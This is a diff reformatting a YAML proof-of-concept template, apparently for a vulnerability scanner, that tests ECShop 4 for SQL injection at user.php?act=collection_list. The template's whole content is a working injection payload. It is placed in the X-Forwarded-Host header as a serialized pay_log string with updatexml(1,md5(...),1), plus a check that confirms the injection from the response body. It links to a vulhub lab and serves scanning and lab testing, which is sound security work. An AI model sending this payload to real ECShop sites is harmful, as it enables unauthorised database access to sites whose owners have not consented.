@@ -1,17 +1,20 @@
 name: poc-yaml-ecshop4-sqli
+manual: true
+transport: http
 set:
-  r1: randomInt(444471, 444481)
+    r1: randomInt(444471, 444481)
 rules:
-  - method: GET
-    path: /user.php?act=collection_list
-    headers:
-      X-Forwarded-Host: >-
-        45ea207d7a2b68c49582d2d22adf953apay_log|s:39:"1' and
-        updatexml(1,md5({{r1}}),1) and '";|
-    follow_redirects: false
-    expression: |
-      response.body.bcontains(bytes(substr(md5(string(r1)), 5, 31)))
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /user.php?act=collection_list
+            headers:
+                X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:39:"1' and updatexml(1,md5({{r1}}),1) and '";|
+            follow_redirects: false
+        expression: response.body.bcontains(bytes(substr(md5(string(r1)), 5, 31)))
+expression: r0()
 detail:
-  author: 曦shen
-  links:
-    - https://github.com/vulhub/vulhub/tree/master/ecshop/collection_list-sqli
+    author: 曦shen
+    links:
+        - https://github.com/vulhub/vulhub/tree/master/ecshop/collection_list-sqli
